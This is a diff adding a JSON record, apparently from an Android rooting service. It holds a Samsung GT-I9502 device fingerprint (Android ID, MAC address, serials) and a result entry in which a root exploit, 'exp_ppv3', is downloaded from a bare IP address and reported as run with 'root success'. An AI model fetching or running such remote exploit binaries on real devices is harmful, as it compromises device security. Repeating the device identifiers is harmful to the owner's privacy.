@@ -1,0 +1,67 @@
+{
+    "device": {
+        "androidId": "e4c96bb5f79ebeed",
+        "macAddr": "40:0E:85:F1:25:BE",
+        "prop": {
+            "ro.serialno": "4d00cf1946eb706d",
+            "persist.sys.country": "CN",
+            "ro.product.name": "ja3gchnduoszn",
+            "ro.build.date": "Tue May 27 17:12:36 KST 2014",
+            "ro.build.version.sdk": "19",
+            "persist.sys.timezone": "Asia/Shanghai",
+            "ro.product.brand": "samsung",
+            "ro.build.description": "ja3gchnduoszn-user 4.4.2 KOT49H I9502ZNUHNE4 release-keys",
+            "ro.build.version.release": "4.4.2",
+            "ro.product.model": "GT-I9502",
+            "persist.sys.language": "zh",
+            "ro.btconfig.vendor": "",
+            "ro.build.date.utc": "1401178356",
+            "ro.runtime.firstboot": "1440769304935",
+            "ro.boot.cpuid": "",
+            "ro.build.fingerprint": "samsung/ja3gchnduoszn/ja3gchnduos:4.4.2/KOT49H/I9502ZNUHNE4:user/release-keys",
+            "persist.sys.dalvik.vm.lib": "libdvm.so"
+        },
+        "cpuinfo": {
+            "revision": "000b",
+            "modelname": "",
+            "cpuimplementer": "0x41",
+            "hardware": "UNIVERSAL5410",
+            "cpurevision": "3",
+            "cpupart": "0xc0f",
+            "cpuarchitecture": "7",
+            "features": "swp half thumb fastmult vfp edsp neon vfpv3 tls vfpv4 idiva idivt",
+            "cpuvariant": "0x2",
+            "serial": "46eb706d4d00cf19",
+            "processorcnt": "4"
+        },
+        "MemTotal": "1905520 kB",
+        "gles": {
+            "EXTENSIONS": "GL_EXT_debug_marker GL_OES_byte_coordinates GL_OES_fixed_point GL_OES_single_precision GL_OES_matrix_get GL_OES_read_format GL_OES_compressed_paletted_texture GL_OES_point_sprite GL_OES_point_size_array GL_OES_matrix_palette GL_OES_draw_texture GL_OES_query_matrix GL_OES_texture_env_crossbar GL_OES_texture_mirrored_repeat GL_OES_texture_cube_map GL_OES_blend_subtract GL_OES_blend_func_separate GL_OES_blend_equation_separate GL_OES_stencil_wrap GL_OES_extended_matrix_palette GL_OES_framebuffer_object GL_OES_rgb8_rgba8 GL_OES_depth24 GL_OES_stencil8 GL_OES_compressed_ETC1_RGB8_texture GL_OES_mapbuffer GL_OES_EGL_image GL_OES_EGL_image_external GL_EXT_multi_draw_arrays GL_OES_required_internalformat GL_IMG_read_format GL_IMG_texture_compression_pvrtc GL_IMG_texture_format_BGRA8888 GL_EXT_texture_format_BGRA8888 GL_OES_egl_sync GL_IMG_vertex_array_object GL_APPLE_texture_2D_limited_npot",
+            "VERSION": "OpenGL ES-CM 1.1",
+            "RENDERER": "PowerVR SGX 544MP",
+            "VENDOR": "Imagination Technologies"
+        },
+        "linuxversion": "3.4.5"
+    },
+    "result": {
+        "exps": [
+            {
+                "urlPie": "http://171.8.4.27:8009/d.php?f=7451c2a5d8fcffe94c264b9cd3ab413967acd2a140da5acb700054faedf9b6b8",
+                "alias": "exp_ppv3",
+                "priority": 0,
+                "fileName": "exp_ppv3",
+                "paras": "-d -e -f 2 -g 97BC48FA1209F56A1A5B0568D8057B4024AC60A1BB05B27C9825B138864BE831CDF51385B289F37FCA28781BE07B5DE9E977D51697EC150AC3A05263B1D816775C3565686841B451EFD876C6A852394988CB73340038ABF7288995FA2B164AB9316BCE3DB3DD2B450A88A7721FB1FFD2D65C9C73EF884D5E4ABDA57C830D2A1D729EED4C31435AD1D1ECBB9FE623A8A7F19C7E23CA46F4E2ACD27547EA5DB504AC4B9BBD61448596A90457B9C5F04741AA7402D538032024A884918DBF2B08FF943E9255C06C7ADB8A1B09DCC0307FF0BE362CB627C39CD76299651A9694AB2A16CFEFC2E6BC72938A5DFD9FA8781C0A19D27A2F744EDDE2B4D5C3DBACBBBCFD",
+                "executedStatus": "exp-invoke-success",
+                "url": "http://171.8.4.27:8009/d.php?f=0ba9523aa558d9230fbff3642d632d2754742bbfc36e6c444bdbedb71d15b662",
+                "uniqueName": "exp_ppv3",
+                "version": 1
+            }
+        ],
+        "msg": "root success",
+        "code": 0
+    },
+    "self": {}
+}
+
+
+
